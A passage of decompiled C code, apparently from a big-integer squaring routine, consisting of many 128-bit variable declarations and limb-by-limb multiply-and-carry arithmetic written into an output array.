  unsigned __int64 v206; // r9
  _BOOL8 v207; // rdi
  unsigned __int128 v208; // rax
  unsigned __int64 v209; // r8
  unsigned __int64 v210; // r9
  _BOOL8 v211; // rdi
  unsigned __int128 v212; // rax
  unsigned __int64 v213; // r9
  unsigned __int64 v214; // r11
  __int64 v215; // rdi
  unsigned __int64 v216; // rbx
  unsigned __int64 v217; // r10
  __int64 v218; // rdi
  unsigned __int128 v219; // krB0_16
  unsigned __int128 v220; // rax
  unsigned __int64 v221; // r8
  __int64 v222; // r9
  _BOOL8 v223; // rsi
  unsigned __int128 v224; // rax
  unsigned __int64 v225; // rcx
  unsigned __int64 v226; // r9
  _BOOL8 v227; // rsi
  unsigned __int128 v228; // rax
  unsigned __int64 v229; // r8
  unsigned __int64 v230; // r9
  _BOOL8 v231; // rsi
  unsigned __int128 v232; // rax
  unsigned __int64 v233; // rcx
  unsigned __int64 v234; // r9
  _BOOL8 v235; // rsi
  unsigned __int128 v236; // rax
  unsigned __int64 v237; // r8
  unsigned __int64 v238; // r9
  _BOOL8 v239; // rsi
  unsigned __int128 v240; // rax
  unsigned __int64 v241; // r9
  unsigned __int64 v242; // r8
  __int64 v243; // rsi
  unsigned __int128 v244; // rax
  unsigned __int64 v245; // r10
  unsigned __int64 v246; // r9
  unsigned __int64 v247; // rdi
  unsigned __int64 v248; // r11
  __int64 v249; // rsi
  unsigned __int128 v250; // krC0_16
  unsigned __int128 v251; // rax
  unsigned __int64 v252; // r8
  __int64 v253; // r9
  _BOOL8 v254; // rbx
  unsigned __int128 v255; // rax
  unsigned __int64 v256; // rcx
  unsigned __int64 v257; // r9
  _BOOL8 v258; // rbx
  unsigned __int128 v259; // rax
  unsigned __int64 v260; // r8
  unsigned __int64 v261; // r9
  _BOOL8 v262; // rbx
  unsigned __int128 v263; // rax
  unsigned __int64 v264; // rcx
  unsigned __int64 v265; // r9
  _BOOL8 v266; // rbx
  unsigned __int128 v267; // rax
  unsigned __int64 v268; // r8
  unsigned __int64 v269; // r9
  _BOOL8 v270; // rbx
  unsigned __int128 v271; // rax
  unsigned __int64 v272; // rcx
  unsigned __int64 v273; // r9
  _BOOL8 v274; // rbx
  unsigned __int128 v275; // rax
  unsigned __int64 v276; // r9
  unsigned __int64 v277; // r11
  __int64 v278; // rbx
  unsigned __int64 v279; // rsi
  unsigned __int64 v280; // r10
  __int64 v281; // rbx
  unsigned __int128 v282; // krD0_16
  unsigned __int128 v283; // rax
  unsigned __int64 v284; // r8
  __int64 v285; // r9
  _BOOL8 v286; // rdi
  unsigned __int128 v287; // rax
  unsigned __int64 v288; // rcx
  unsigned __int64 v289; // r9
  _BOOL8 v290; // rdi
  unsigned __int128 v291; // rax
  unsigned __int64 v292; // r8
  unsigned __int64 v293; // r9
  _BOOL8 v294; // rdi
  unsigned __int128 v295; // rax
  unsigned __int64 v296; // rcx
  unsigned __int64 v297; // r9
  _BOOL8 v298; // rdi
  unsigned __int128 v299; // rax
  unsigned __int64 v300; // r8
  unsigned __int64 v301; // r9
  _BOOL8 v302; // rdi
  unsigned __int128 v303; // rax
  unsigned __int64 v304; // r9
  unsigned __int64 v305; // r8
  __int64 v306; // rdi
  unsigned __int128 v307; // rax
  unsigned __int64 v308; // r10
  unsigned __int64 v309; // r9
  unsigned __int64 v310; // rbx
  unsigned __int64 v311; // r11
  __int64 v312; // rdi
  unsigned __int128 v313; // krE0_16
  unsigned __int128 v314; // rax
  unsigned __int64 v315; // r8
  __int64 v316; // r9
  _BOOL8 v317; // rbx
  unsigned __int128 v318; // rax
  unsigned __int64 v319; // rcx
  unsigned __int64 v320; // r9
  _BOOL8 v321; // rbx
  unsigned __int128 v322; // rax
  unsigned __int64 v323; // r8
  unsigned __int64 v324; // r9
  _BOOL8 v325; // rbx
  unsigned __int128 v326; // rax
  unsigned __int64 v327; // rcx
  unsigned __int64 v328; // r9
  _BOOL8 v329; // rbx
  unsigned __int128 v330; // rax
  unsigned __int64 v331; // r8
  unsigned __int64 v332; // r9
  _BOOL8 v333; // rbx
  unsigned __int128 v334; // rax
  unsigned __int64 v335; // r9
  unsigned __int64 v336; // r11
  __int64 v337; // rbx
  unsigned __int64 v338; // rdi
  unsigned __int64 v339; // r10
  __int64 v340; // rbx
  unsigned __int128 v341; // krF0_16
  unsigned __int128 v342; // rax
  unsigned __int64 v343; // r8
  __int64 v344; // r9
  _BOOL8 v345; // rdi
  unsigned __int128 v346; // rax
  unsigned __int64 v347; // rcx
  unsigned __int64 v348; // r9
  _BOOL8 v349; // rdi
  unsigned __int128 v350; // rax
  unsigned __int64 v351; // r8
  unsigned __int64 v352; // r9
  _BOOL8 v353; // rdi
  unsigned __int128 v354; // rax
  unsigned __int64 v355; // rcx
  unsigned __int64 v356; // r9
  _BOOL8 v357; // rdi
  unsigned __int128 v358; // rax
  unsigned __int64 v359; // r9
  unsigned __int64 v360; // r8
  __int64 v361; // rdi
  unsigned __int128 v362; // rax
  unsigned __int64 v363; // r10
  unsigned __int64 v364; // r9
  unsigned __int64 v365; // rbx
  unsigned __int64 v366; // r11
  __int64 v367; // rdi
  unsigned __int128 v368; // kr100_16
  unsigned __int128 v369; // rax
  unsigned __int64 v370; // r8
  __int64 v371; // r9
  _BOOL8 v372; // rbx
  unsigned __int128 v373; // rax
  unsigned __int64 v374; // rcx
  unsigned __int64 v375; // r9
  _BOOL8 v376; // rbx
  unsigned __int128 v377; // rax
  unsigned __int64 v378; // r8
  unsigned __int64 v379; // r9
  _BOOL8 v380; // rbx
  unsigned __int128 v381; // rax
  unsigned __int64 v382; // rcx
  unsigned __int64 v383; // r9
  _BOOL8 v384; // rbx
  unsigned __int128 v385; // rax
  unsigned __int64 v386; // r9
  unsigned __int64 v387; // r11
  __int64 v388; // rbx
  unsigned __int64 v389; // rdi
  unsigned __int64 v390; // r10
  __int64 v391; // rbx
  unsigned __int128 v392; // kr110_16
  unsigned __int128 v393; // rax
  unsigned __int64 v394; // r8
  __int64 v395; // r9
  _BOOL8 v396; // rdi
  unsigned __int128 v397; // rax
  unsigned __int64 v398; // rcx
  unsigned __int64 v399; // r9
  _BOOL8 v400; // rdi
  unsigned __int128 v401; // rax
  unsigned __int64 v402; // r8
  unsigned __int64 v403; // r9
  _BOOL8 v404; // rdi
  unsigned __int128 v405; // rax
  unsigned __int64 v406; // r9
  unsigned __int64 v407; // r8
  __int64 v408; // rdi
  unsigned __int128 v409; // rax
  unsigned __int64 v410; // r10
  unsigned __int64 v411; // r9
  unsigned __int64 v412; // rbx
  unsigned __int64 v413; // r11
  __int64 v414; // rdi
  unsigned __int128 v415; // kr120_16
  unsigned __int128 v416; // rax
  unsigned __int64 v417; // r8
  __int64 v418; // r9
  _BOOL8 v419; // rbx
  unsigned __int128 v420; // rax
  unsigned __int64 v421; // rcx
  unsigned __int64 v422; // r9
  _BOOL8 v423; // rbx
  unsigned __int128 v424; // rax
  unsigned __int64 v425; // r8
  unsigned __int64 v426; // r9
  _BOOL8 v427; // rbx
  unsigned __int128 v428; // rax
  unsigned __int64 v429; // r9
  unsigned __int64 v430; // r11
  __int64 v431; // rbx
  unsigned __int64 v432; // rdi
  unsigned __int64 v433; // r10
  __int64 v434; // rbx
  unsigned __int128 v435; // kr130_16
  unsigned __int128 v436; // rax
  unsigned __int64 v437; // r8
  __int64 v438; // r9
  _BOOL8 v439; // rdi
  unsigned __int128 v440; // rax
  unsigned __int64 v441; // rcx
  unsigned __int64 v442; // r9
  _BOOL8 v443; // rdi
  unsigned __int128 v444; // rax
  unsigned __int64 v445; // r9
  unsigned __int64 v446; // r8
  __int64 v447; // rdi
  unsigned __int128 v448; // rax
  unsigned __int64 v449; // r10
  unsigned __int64 v450; // r9
  unsigned __int64 v451; // rbx
  unsigned __int64 v452; // r11
  __int64 v453; // rdi
  unsigned __int128 v454; // kr140_16
  unsigned __int128 v455; // rax
  unsigned __int64 v456; // r8
  __int64 v457; // r9
  _BOOL8 v458; // rbx
  unsigned __int128 v459; // rax
  unsigned __int64 v460; // rcx
  unsigned __int64 v461; // r9
  _BOOL8 v462; // rbx
  unsigned __int128 v463; // rax
  unsigned __int64 v464; // r9
  unsigned __int64 v465; // r11
  __int64 v466; // rbx
  unsigned __int64 v467; // rdi
  unsigned __int64 v468; // r10
  __int64 v469; // rbx
  unsigned __int128 v470; // kr150_16
  unsigned __int128 v471; // rax
  unsigned __int64 v472; // r8
  __int64 v473; // r9
  _BOOL8 v474; // rdi
  unsigned __int128 v475; // rax
  unsigned __int64 v476; // r8
  unsigned __int64 v477; // r9
  __int64 v478; // rdi
  unsigned __int128 v479; // rax
  unsigned __int64 v480; // r10
  unsigned __int64 v481; // r9
  unsigned __int64 v482; // rbx
  unsigned __int64 v483; // r11
  __int64 v484; // rdi
  unsigned __int128 v485; // kr160_16
  unsigned __int128 v486; // rax
  unsigned __int64 v487; // r8
  __int64 v488; // r9
  _BOOL8 v489; // rbx
  unsigned __int128 v490; // rax
  unsigned __int64 v491; // r9
  unsigned __int64 v492; // r11
  __int64 v493; // rbx
  unsigned __int64 v494; // rdi
  unsigned __int64 v495; // r10
  unsigned __int128 v496; // kr170_16
  unsigned __int128 v497; // rax
  unsigned __int64 v498; // r8
  __int64 v499; // rdi
  unsigned __int128 v500; // rax
  unsigned __int64 v501; // r10
  unsigned __int64 v502; // r9
  unsigned __int64 v503; // rbx
  __int64 v504; // rdi
  unsigned __int128 v505; // kr180_16
  unsigned __int128 v506; // rax
  unsigned __int64 v507; // r11
  __int64 v508; // rbx
  unsigned __int64 v509; // rdi
  unsigned __int64 v510; // r10
  __int64 v511; // rbx
  unsigned __int64 v512; // r8
  unsigned __int128 v513; // rax
  unsigned __int64 v514; // r10
  unsigned __int64 v515; // r9
  unsigned __int64 v516; // rbx
  unsigned __int64 v517; // r11
  unsigned __int64 v518; // rcx
  unsigned __int128 v519; // rax
  unsigned __int64 v520; // r11
  unsigned __int64 v521; // r8
  unsigned __int128 v522; // rax
  unsigned __int64 result; // rax

  v4 = *a2 * (unsigned __int128)*a2;
  *a1 = v4;
  v5 = (*a2 * (unsigned __int128)a2[1]) >> 64;
  v6 = *((_QWORD *)&v4 + 1) + 2 * *a2 * a2[1];
  v7 = *a2 * (unsigned __int128)a2[1] * 2;
  v8 = v6 < 2 * *a2 * a2[1];
  a1[1] = v6;
  v9 = *((_QWORD *)&v7 + 1) + v8;
  v10 = (v9 < v8) + (unsigned __int64)((__int128)v5 >> 63);
  v11 = (__int128)((*a2 * (unsigned __int128)a2[2]) >> 64) >> 63;
  v12 = 2 * *a2 * a2[2];
  v13 = *a2 * (unsigned __int128)a2[2];
  v14 = a2[1] * (unsigned __int128)a2[1];
  *(_QWORD *)&v14 = v12 + v14;
  *((_QWORD *)&v14 + 1) += (unsigned __int64)v14 < v12;
  v15 = v14 + v9;
  a1[2] = v15;
  v16 = (v15 < (unsigned __int64)v14) + v10;
  v17 = (v13 >> 63) + *((_QWORD *)&v14 + 1);
  v18 = (v17 + v16 < v16) + (v17 < *((_QWORD *)&v14 + 1)) + v11;
  v19 = *a2 * (unsigned __int128)a2[3];
  v20 = a2[1] * (unsigned __int128)a2[2];
  *(_QWORD *)&v20 = v19 + v20;
  *((_QWORD *)&v20 + 1) += (unsigned __int64)v20 < (unsigned __int64)v19;
  v21 = v17 + v16 + 2 * v20;
  a1[3] = v21;
  *((_QWORD *)&v13 + 1) = *((_QWORD *)&v19 + 1) + *((_QWORD *)&v20 + 1) < *((_QWORD *)&v20 + 1);
  *(_QWORD *)&v13 = *((_QWORD *)&v19 + 1) + *((_QWORD *)&v20 + 1);
  v22 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = *((_QWORD *)&v19 + 1) + *((_QWORD *)&v20 + 1);
  *(_QWORD *)&v13 = v20;
  v23 = (v21 < 2 * (__int64)v20) + v18;
  v24 = (v13 >> 63) + v23;
  v25 = (v24 < v23) + v22;
  v26 = *a2 * (unsigned __int128)a2[4];
  v27 = a2[1] * (unsigned __int128)a2[3];
  *(_QWORD *)&v27 = v26 + v27;
  *((_QWORD *)&v27 + 1) += (unsigned __int64)v27 < (unsigned __int64)v26;
  *((_QWORD *)&v13 + 1) = *((_QWORD *)&v27 + 1) + *((_QWORD *)&v26 + 1) < *((_QWORD *)&v27 + 1);
  *(_QWORD *)&v13 = *((_QWORD *)&v27 + 1) + *((_QWORD *)&v26 + 1);
  v28 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = *((_QWORD *)&v27 + 1) + *((_QWORD *)&v26 + 1);
  *(_QWORD *)&v13 = v27;
  v29 = 2 * v27;
  v30 = a2[2] * (unsigned __int128)a2[2];
  *(_QWORD *)&v30 = v29 + v30;
  *((_QWORD *)&v30 + 1) += (unsigned __int64)v30 < v29;
  v31 = v30 + v24;
  a1[4] = v31;
  v32 = (v31 < (unsigned __int64)v30) + v25;
  v33 = (v13 >> 63) + *((_QWORD *)&v30 + 1);
  v34 = v33 + v32;
  v35 = (v33 + v32 < v32) + (v33 < *((_QWORD *)&v30 + 1)) + v28;
  v36 = *a2 * (unsigned __int128)a2[5];
  v37 = a2[1] * (unsigned __int128)a2[4];
  v38 = v36 + v37;
  *((_QWORD *)&v37 + 1) += (_QWORD)v36 + (_QWORD)v37 < (unsigned __int64)v36;
  v39 = *((_QWORD *)&v36 + 1) + *((_QWORD *)&v37 + 1);
  v40 = *((_QWORD *)&v36 + 1) + *((_QWORD *)&v37 + 1) < *((_QWORD *)&v37 + 1);
  v41 = a2[2] * (unsigned __int128)a2[3];
  *(_QWORD *)&v41 = v38 + v41;
  *((_QWORD *)&v41 + 1) += (unsigned __int64)v41 < v38;
  v42 = *((_QWORD *)&v41 + 1) + v39;
  v43 = v34 + 2 * v41;
  a1[5] = v43;
  *((_QWORD *)&v13 + 1) = (v42 < *((_QWORD *)&v41 + 1)) + v40;
  *(_QWORD *)&v13 = v42;
  v44 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v42;
  *(_QWORD *)&v13 = v41;
  v45 = (v43 < 2 * (__int64)v41) + v35;
  v46 = (v13 >> 63) + v45;
  v8 = v46 < v45;
  v47 = *a2 * (unsigned __int128)a2[6];
  v48 = a2[1] * (unsigned __int128)a2[5];
  v49 = v47 + v48;
  *((_QWORD *)&v48 + 1) += (_QWORD)v47 + (_QWORD)v48 < (unsigned __int64)v47;
  v50 = *((_QWORD *)&v48 + 1) + *((_QWORD *)&v47 + 1);
  v51 = *((_QWORD *)&v48 + 1) + *((_QWORD *)&v47 + 1) < *((_QWORD *)&v48 + 1);
  v52 = a2[2] * (unsigned __int128)a2[4];
  *(_QWORD *)&v52 = v49 + v52;
  *((_QWORD *)&v52 + 1) += (unsigned __int64)v52 < v49;
  v53 = *((_QWORD *)&v52 + 1) + v50;
  v54 = 2 * v52;
  *((_QWORD *)&v13 + 1) = (v53 < *((_QWORD *)&v52 + 1)) + v51;
  *(_QWORD *)&v13 = v53;
  v55 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v53;
  *(_QWORD *)&v13 = v52;
  v56 = a2[3] * (unsigned __int128)a2[3];
  *(_QWORD *)&v56 = v54 + v56;
  *((_QWORD *)&v56 + 1) += (unsigned __int64)v56 < v54;
  v57 = v56 + v46;
  v58 = *((_QWORD *)&v56 + 1) + (v13 >> 63);
  v59 = (v57 < (unsigned __int64)v56) + v8 + v44;
  v60 = v58 + v59;
  a1[6] = v57;
  v61 = (v58 < *((_QWORD *)&v56 + 1)) + (v58 + v59 < v59) + v55;
  v62 = *a2 * (unsigned __int128)a2[7];
  v63 = a2[1] * (unsigned __int128)a2[6];
  v64 = v62 + v63;
  *((_QWORD *)&v63 + 1) += (_QWORD)v62 + (_QWORD)v63 < (unsigned __int64)v62;
  v65 = *((_QWORD *)&v63 + 1) + *((_QWORD *)&v62 + 1);
  v66 = *((_QWORD *)&v63 + 1) + *((_QWORD *)&v62 + 1) < *((_QWORD *)&v63 + 1);
  v67 = a2[2] * (unsigned __int128)a2[5];
  v68 = v64 + v67;
  *((_QWORD *)&v67 + 1) += v64 + (unsigned __int64)v67 < v64;
  v69 = *((_QWORD *)&v67 + 1) + v65;
  v70 = (v69 < *((_QWORD *)&v67 + 1)) + v66;
  v71 = a2[3] * (unsigned __int128)a2[4];
  *(_QWORD *)&v71 = v68 + v71;
  *((_QWORD *)&v71 + 1) += (unsigned __int64)v71 < v68;
  v72 = *((_QWORD *)&v71 + 1) + v69;
  v73 = v60 + 2 * v71;
  a1[7] = v73;
  *((_QWORD *)&v13 + 1) = (v72 < *((_QWORD *)&v71 + 1)) + v70;
  *(_QWORD *)&v13 = v72;
  v74 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v72;
  *(_QWORD *)&v13 = v71;
  v75 = (v73 < 2 * (__int64)v71) + v61;
  v76 = (v13 >> 63) + v75;
  v77 = (v76 < v75) + v74;
  v78 = *a2 * (unsigned __int128)a2[8];
  v79 = a2[1] * (unsigned __int128)a2[7];
  v80 = v78 + v79;
  *((_QWORD *)&v79 + 1) += (_QWORD)v78 + (_QWORD)v79 < (unsigned __int64)v78;
  v81 = *((_QWORD *)&v79 + 1) + *((_QWORD *)&v78 + 1);
  v82 = *((_QWORD *)&v79 + 1) + *((_QWORD *)&v78 + 1) < *((_QWORD *)&v79 + 1);
  v83 = a2[2] * (unsigned __int128)a2[6];
  v84 = v80 + v83;
  *((_QWORD *)&v83 + 1) += v80 + (unsigned __int64)v83 < v80;
  v85 = *((_QWORD *)&v83 + 1) + v81;
  v86 = (v85 < *((_QWORD *)&v83 + 1)) + v82;
  v87 = a2[3] * (unsigned __int128)a2[5];
  *(_QWORD *)&v87 = v84 + v87;
  *((_QWORD *)&v87 + 1) += (unsigned __int64)v87 < v84;
  v88 = *((_QWORD *)&v87 + 1) + v85;
  v89 = 2 * v87;
  *((_QWORD *)&v13 + 1) = (v88 < *((_QWORD *)&v87 + 1)) + v86;
  *(_QWORD *)&v13 = v88;
  v90 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v88;
  *(_QWORD *)&v13 = v87;
  v91 = a2[4] * (unsigned __int128)a2[4];
  *(_QWORD *)&v91 = v89 + v91;
  *((_QWORD *)&v91 + 1) += (unsigned __int64)v91 < v89;
  v92 = *((_QWORD *)&v91 + 1) + (v13 >> 63);
  v93 = v91 + v76;
  a1[8] = v93;
  v94 = (v93 < (unsigned __int64)v91) + v77;
  v95 = v92 + v94;
  v96 = (v92 < *((_QWORD *)&v91 + 1)) + (v92 + v94 < v94) + v90;
  v97 = *a2 * (unsigned __int128)a2[9];
  v98 = a2[1] * (unsigned __int128)a2[8];
  v99 = v97 + v98;
  *((_QWORD *)&v98 + 1) += (_QWORD)v97 + (_QWORD)v98 < (unsigned __int64)v97;
  v100 = *((_QWORD *)&v98 + 1) + *((_QWORD *)&v97 + 1);
  v101 = *((_QWORD *)&v98 + 1) + *((_QWORD *)&v97 + 1) < *((_QWORD *)&v98 + 1);
  v102 = a2[2] * (unsigned __int128)a2[7];
  v103 = v99 + v102;
  *((_QWORD *)&v102 + 1) += v99 + (unsigned __int64)v102 < v99;
  v104 = *((_QWORD *)&v102 + 1) + v100;
  v105 = (v104 < *((_QWORD *)&v102 + 1)) + v101;
  v106 = a2[3] * (unsigned __int128)a2[6];
  v107 = v103 + v106;
  *((_QWORD *)&v106 + 1) += v103 + (unsigned __int64)v106 < v103;
  v108 = *((_QWORD *)&v106 + 1) + v104;
  v109 = (v108 < *((_QWORD *)&v106 + 1)) + v105;
  v110 = a2[4] * (unsigned __int128)a2[5];
  *(_QWORD *)&v110 = v107 + v110;
  *((_QWORD *)&v110 + 1) += (unsigned __int64)v110 < v107;
  v111 = *((_QWORD *)&v110 + 1) + v108;
  v112 = v95 + 2 * v110;
  a1[9] = v112;
  *((_QWORD *)&v13 + 1) = (v111 < *((_QWORD *)&v110 + 1)) + v109;
  *(_QWORD *)&v13 = v111;
  v113 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v111;
  *(_QWORD *)&v13 = v110;
  v114 = (v112 < 2 * (__int64)v110) + v96;
  v115 = (v13 >> 63) + v114;
  v116 = (v115 < v114) + v113;
  v117 = *a2 * (unsigned __int128)a2[10];
  v118 = a2[1] * (unsigned __int128)a2[9];
  v119 = v117 + v118;
  *((_QWORD *)&v118 + 1) += (_QWORD)v117 + (_QWORD)v118 < (unsigned __int64)v117;
  v120 = *((_QWORD *)&v118 + 1) + *((_QWORD *)&v117 + 1);
  v121 = *((_QWORD *)&v118 + 1) + *((_QWORD *)&v117 + 1) < *((_QWORD *)&v118 + 1);
  v122 = a2[2] * (unsigned __int128)a2[8];
  v123 = v119 + v122;
  *((_QWORD *)&v122 + 1) += v119 + (unsigned __int64)v122 < v119;
  v124 = *((_QWORD *)&v122 + 1) + v120;
  v125 = (v124 < *((_QWORD *)&v122 + 1)) + v121;
  v126 = a2[3] * (unsigned __int128)a2[7];
  v127 = v123 + v126;
  *((_QWORD *)&v126 + 1) += v123 + (unsigned __int64)v126 < v123;
  v128 = *((_QWORD *)&v126 + 1) + v124;
  v129 = (v128 < *((_QWORD *)&v126 + 1)) + v125;
  v130 = a2[4] * (unsigned __int128)a2[6];
  *(_QWORD *)&v130 = v127 + v130;
  *((_QWORD *)&v130 + 1) += (unsigned __int64)v130 < v127;
  v131 = *((_QWORD *)&v130 + 1) + v128;
  v132 = 2 * v130;
  *((_QWORD *)&v13 + 1) = (v131 < *((_QWORD *)&v130 + 1)) + v129;
  *(_QWORD *)&v13 = v131;
  v133 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v131;
  *(_QWORD *)&v13 = v130;
  v134 = a2[5] * (unsigned __int128)a2[5];
  *(_QWORD *)&v134 = v132 + v134;
  *((_QWORD *)&v134 + 1) += (unsigned __int64)v134 < v132;
  v135 = v134 + v115;
  v136 = *((_QWORD *)&v134 + 1) + (v13 >> 63);
  a1[10] = v135;
  v137 = (v135 < (unsigned __int64)v134) + v116;
  v138 = v136 + v137;
  v139 = (v136 < *((_QWORD *)&v134 + 1)) + (v136 + v137 < v137) + v133;
  v140 = *a2 * (unsigned __int128)a2[11];
  v141 = a2[1] * (unsigned __int128)a2[10];
  v142 = v140 + v141;
  *((_QWORD *)&v141 + 1) += (_QWORD)v140 + (_QWORD)v141 < (unsigned __int64)v140;
  v143 = *((_QWORD *)&v141 + 1) + *((_QWORD *)&v140 + 1);
  v144 = *((_QWORD *)&v141 + 1) + *((_QWORD *)&v140 + 1) < *((_QWORD *)&v141 + 1);
  v145 = a2[2] * (unsigned __int128)a2[9];
  v146 = v142 + v145;
  *((_QWORD *)&v145 + 1) += v142 + (unsigned __int64)v145 < v142;
  v147 = *((_QWORD *)&v145 + 1) + v143;
  v148 = (v147 < *((_QWORD *)&v145 + 1)) + v144;
  v149 = a2[3] * (unsigned __int128)a2[8];
  v150 = v146 + v149;
  *((_QWORD *)&v149 + 1) += v146 + (unsigned __int64)v149 < v146;
  v151 = *((_QWORD *)&v149 + 1) + v147;
  v152 = (v151 < *((_QWORD *)&v149 + 1)) + v148;
  v153 = a2[4] * (unsigned __int128)a2[7];
  v154 = v150 + v153;
  *((_QWORD *)&v153 + 1) += v150 + (unsigned __int64)v153 < v150;
  v155 = *((_QWORD *)&v153 + 1) + v151;
  v156 = (v155 < *((_QWORD *)&v153 + 1)) + v152;
  v157 = a2[5] * (unsigned __int128)a2[6];
  *(_QWORD *)&v157 = v154 + v157;
  *((_QWORD *)&v157 + 1) += (unsigned __int64)v157 < v154;
  v158 = *((_QWORD *)&v157 + 1) + v155;
  v159 = v138 + 2 * v157;
  *((_QWORD *)&v13 + 1) = (v158 < *((_QWORD *)&v157 + 1)) + v156;
  *(_QWORD *)&v13 = v158;
  v160 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v158;
  *(_QWORD *)&v13 = v157;
  v161 = (v159 < 2 * (__int64)v157) + v139;
  a1[11] = v159;
  v162 = (v13 >> 63) + v161;
  v163 = (v162 < v161) + v160;
  v164 = *a2 * (unsigned __int128)a2[12];
  v165 = a2[1] * (unsigned __int128)a2[11];
  v166 = v164 + v165;
  *((_QWORD *)&v165 + 1) += (_QWORD)v164 + (_QWORD)v165 < (unsigned __int64)v164;
  v167 = *((_QWORD *)&v165 + 1) + *((_QWORD *)&v164 + 1);
  v168 = *((_QWORD *)&v165 + 1) + *((_QWORD *)&v164 + 1) < *((_QWORD *)&v165 + 1);
  v169 = a2[2] * (unsigned __int128)a2[10];
  v170 = v166 + v169;
  *((_QWORD *)&v169 + 1) += v166 + (unsigned __int64)v169 < v166;
  v171 = *((_QWORD *)&v169 + 1) + v167;
  v172 = (v171 < *((_QWORD *)&v169 + 1)) + v168;
  v173 = a2[3] * (unsigned __int128)a2[9];
  v174 = v170 + v173;
  *((_QWORD *)&v173 + 1) += v170 + (unsigned __int64)v173 < v170;
  v175 = *((_QWORD *)&v173 + 1) + v171;
  v176 = (v175 < *((_QWORD *)&v173 + 1)) + v172;
  v177 = a2[4] * (unsigned __int128)a2[8];
  v178 = v174 + v177;
  *((_QWORD *)&v177 + 1) += v174 + (unsigned __int64)v177 < v174;
  v179 = *((_QWORD *)&v177 + 1) + v175;
  v180 = (v179 < *((_QWORD *)&v177 + 1)) + v176;
  v181 = a2[5] * (unsigned __int128)a2[7];
  *(_QWORD *)&v181 = v178 + v181;
  *((_QWORD *)&v181 + 1) += (unsigned __int64)v181 < v178;
  v182 = *((_QWORD *)&v181 + 1) + v179;
  v183 = 2 * v181;
  *((_QWORD *)&v13 + 1) = (v182 < *((_QWORD *)&v181 + 1)) + v180;
  *(_QWORD *)&v13 = v182;
  v184 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v182;
  *(_QWORD *)&v13 = v181;
  v185 = a2[6] * (unsigned __int128)a2[6];
  *(_QWORD *)&v185 = v183 + v185;
  *((_QWORD *)&v185 + 1) += (unsigned __int64)v185 < v183;
  v186 = v185 + v162;
  v187 = *((_QWORD *)&v185 + 1) + (v13 >> 63);
  a1[12] = v186;
  v188 = (v186 < (unsigned __int64)v185) + v163;
  v189 = v187 + v188;
  v190 = (v187 < *((_QWORD *)&v185 + 1)) + (v187 + v188 < v188) + v184;
  v191 = *a2 * (unsigned __int128)a2[13];
  v192 = a2[1] * (unsigned __int128)a2[12];
  v193 = v191 + v192;
  *((_QWORD *)&v192 + 1) += (_QWORD)v191 + (_QWORD)v192 < (unsigned __int64)v191;
  v194 = *((_QWORD *)&v192 + 1) + *((_QWORD *)&v191 + 1);
  v195 = *((_QWORD *)&v192 + 1) + *((_QWORD *)&v191 + 1) < *((_QWORD *)&v192 + 1);
  v196 = a2[2] * (unsigned __int128)a2[11];
  v197 = v193 + v196;
  *((_QWORD *)&v196 + 1) += v193 + (unsigned __int64)v196 < v193;
  v198 = *((_QWORD *)&v196 + 1) + v194;
  v199 = (v198 < *((_QWORD *)&v196 + 1)) + v195;
  v200 = a2[3] * (unsigned __int128)a2[10];
  v201 = v197 + v200;
  *((_QWORD *)&v200 + 1) += v197 + (unsigned __int64)v200 < v197;
  v202 = *((_QWORD *)&v200 + 1) + v198;
  v203 = (v202 < *((_QWORD *)&v200 + 1)) + v199;
  v204 = a2[4] * (unsigned __int128)a2[9];
  v205 = v201 + v204;
  *((_QWORD *)&v204 + 1) += v201 + (unsigned __int64)v204 < v201;
  v206 = *((_QWORD *)&v204 + 1) + v202;
  v207 = (v206 < *((_QWORD *)&v204 + 1)) + v203;
  v208 = a2[5] * (unsigned __int128)a2[8];
  v209 = v205 + v208;
  *((_QWORD *)&v208 + 1) += v205 + (unsigned __int64)v208 < v205;
  v210 = *((_QWORD *)&v208 + 1) + v206;
  v211 = (v210 < *((_QWORD *)&v208 + 1)) + v207;
  v212 = a2[6] * (unsigned __int128)a2[7];
  *(_QWORD *)&v212 = v209 + v212;
  *((_QWORD *)&v212 + 1) += (unsigned __int64)v212 < v209;
  v213 = *((_QWORD *)&v212 + 1) + v210;
  v214 = v189 + 2 * v212;
  a1[13] = v214;
  *((_QWORD *)&v13 + 1) = (v213 < *((_QWORD *)&v212 + 1)) + v211;
  *(_QWORD *)&v13 = v213;
  v215 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v213;
  *(_QWORD *)&v13 = v212;
  v216 = (v214 < 2 * (__int64)v212) + v190;
  v217 = (v13 >> 63) + v216;
  v218 = (v217 < v216) + v215;
  v219 = *a2 * (unsigned __int128)a2[14];
  v220 = a2[1] * (unsigned __int128)a2[13];
  v221 = v219 + v220;
  *((_QWORD *)&v220 + 1) += (_QWORD)v219 + (_QWORD)v220 < (unsigned __int64)v219;
  v222 = *((_QWORD *)&v220 + 1) + *((_QWORD *)&v219 + 1);
  v223 = *((_QWORD *)&v220 + 1) + *((_QWORD *)&v219 + 1) < *((_QWORD *)&v220 + 1);
  v224 = a2[2] * (unsigned __int128)a2[12];
  v225 = v221 + v224;
  *((_QWORD *)&v224 + 1) += v221 + (unsigned __int64)v224 < v221;
  v226 = *((_QWORD *)&v224 + 1) + v222;
  v227 = (v226 < *((_QWORD *)&v224 + 1)) + v223;
  v228 = a2[3] * (unsigned __int128)a2[11];
  v229 = v225 + v228;
  *((_QWORD *)&v228 + 1) += v225 + (unsigned __int64)v228 < v225;
  v230 = *((_QWORD *)&v228 + 1) + v226;
  v231 = (v230 < *((_QWORD *)&v228 + 1)) + v227;
  v232 = a2[4] * (unsigned __int128)a2[10];
  v233 = v229 + v232;
  *((_QWORD *)&v232 + 1) += v229 + (unsigned __int64)v232 < v229;
  v234 = *((_QWORD *)&v232 + 1) + v230;
  v235 = (v234 < *((_QWORD *)&v232 + 1)) + v231;
  v236 = a2[5] * (unsigned __int128)a2[9];
  v237 = v233 + v236;
  *((_QWORD *)&v236 + 1) += v233 + (unsigned __int64)v236 < v233;
